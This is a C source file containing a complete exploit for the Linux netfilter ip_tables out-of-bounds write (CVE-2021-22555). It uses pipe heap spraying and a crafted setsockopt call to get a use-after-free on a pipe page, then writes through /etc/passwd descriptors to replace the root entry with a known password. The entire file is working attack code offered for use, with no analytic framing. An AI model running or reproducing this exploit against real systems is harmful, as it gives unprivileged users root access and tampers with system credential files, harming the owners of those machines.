#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netfilter_ipv4/ip_tables.h>

#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");


#define SOCKET_NUM 16
#define SK_BUFF_NUM 128
#define PIPE_NUM 0x80
#define FILE_NUM 0x100

int pipe_fd[PIPE_NUM][2];

int file_fd[FILE_NUM];



void errExit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}



void trigger_oob_write(int socket_fd)
{
    struct __attribute__((__packed__)) {
        struct ipt_replace replace;
        struct ipt_entry entry;
        struct xt_entry_match match;
        char pad[0x108 + 0x1000 - 0x200 - 0x3];
        struct xt_entry_target target;
    } data = {0};

    data.replace.num_counters = 1;
    data.replace.num_entries = 1;
    data.replace.size = sizeof(data.entry) + sizeof(data.match)
            + sizeof(data.pad) + sizeof(data.target);
    
    data.entry.next_offset = sizeof(data.entry) + sizeof(data.match)
            + sizeof(data.pad) + sizeof(data.target);
    data.entry.target_offset = 
            sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad);
    
    data.match.u.user.match_size = sizeof(data.match) + sizeof(data.pad);
    strcpy(data.match.u.user.name, "icmp");
    data.match.u.user.revision = 0;

    data.target.u.user.target_size = sizeof(data.target);
    strcpy(data.target.u.user.name, "NFQUEUE");
    data.target.u.user.revision = 1;

    // partial overwrite the next object
    if (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)))
        if (errno == ENOPROTOOPT)
            errExit("ip_tables module is not loaded!");
}



int main(int argc, char **argv, char **envp)
{
    int         socket_fd;
    cpu_set_t   cpu_set;

    /*
     * Step.O
     * Initialization
     */
    puts("\033[32m\033[1m[+] CVE-2021-22555 no leak page-uaf.\033[0m");

    // ident namespace
    if (unshare(CLONE_NEWUSER) < 0)
        errExit("failed to unshare(CLONE_NEWUSER)");
    if (unshare(CLONE_NEWNET) < 0)
        errExit("failed to unshare(CLONE_NEWNET)");

    // run the exp on specific core only
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    // socket to trigert off-by-null
    if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        errExit("failed to create socket!");
    
    void *tmp = malloc(0x1000);

    size_t pipe_magic;
    for(int i=0;i<PIPE_NUM;i++)
    {
        if(pipe(pipe_fd[i])<0)
        {
            errExit("PIPE_ERROR.");
        }
    }


    for(int i=0;i<PIPE_NUM;i++)
    {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            printf("[x] failed to extend %d pipe!\n",i);
            return -1;
        }
    }

    for(int i=0;i<PIPE_NUM;i++)
    {
        if(i%0x10!=0)
        {
            memcpy(tmp,"(Lotus!)",0x8);
            pipe_magic = 0xdeadbeef+i;
            write(pipe_fd[i][1],tmp,0x8);
            write(pipe_fd[i][1],&pipe_magic,0x8);
        }
        
    }
    // getchar();

    puts("[*] Create hole.");
    for(int i=0x10;i<PIPE_NUM;i+=0x10)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
    

    

    puts("[*] Trigger off by null");

    trigger_oob_write(socket_fd);

    size_t victim_id = 0;
    size_t prev_id = 0;
    size_t magic = 0;
    char *tmp_content = malloc(0x1000);
    for(int i=0;i<PIPE_NUM;i++)
    {
        if(i%0x10)
        {
            read(pipe_fd[i][0],tmp_content,0x8);
            read(pipe_fd[i][0],&magic,0x8);
            if(!strncmp(tmp_content,"(Lotus!)",8)&&magic!=0xdeadbeef+i)
            {
                victim_id = magic-0xdeadbeef;
                prev_id = i;
                BLUE printf("[*] Found the two pipe 0x%x and 0x%x\n",victim_id,prev_id);
                break;
            }
        }
    }
    if(!victim_id)
    {
        errExit("[*] Not found two pipe.");
    }

    write(pipe_fd[prev_id][1],tmp_content,0x3c+0x8);

    // getchar();
    puts("[*] UAF one of the pipe->page.");
    close(pipe_fd[victim_id][0]);
    close(pipe_fd[victim_id][1]);

    puts("[*] Spray passwd file...");

    for(int i=0;i<FILE_NUM;i++)
    {
        file_fd[i] = open("/etc/passwd",0);
        if(!file_fd[i])
        {
            errExit("Open busybox ERROR!");
        }
    }

    // getchar();
    int a[2];
    a[0] = 0x480e801f;
    write(pipe_fd[prev_id][1], a, 4);

    printf("Creating the pwd.bck\n");

    system("cp /etc/passwd /tmp/passwd.bak");

    char *data = "root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt Lotus Lotus
    printf("Setting root password to \"Lotus\"...\n");
    int data_size = strlen(data);

    puts("[*]finally: edit the pwd file");
    //what we want to edit pipe->page
    for (int i = 0;i < FILE_NUM; i++) {
        int retval = write(file_fd[i], data,data_size);
            if (retval > 0)
            {
               RED printf("Write Success:%d!",i); CLOSE
            }

        }

    // getchar();
    // //0xe801f
    
    // GREEN puts("[*] Edit the file for busybox f_mode..."); CLOSE
}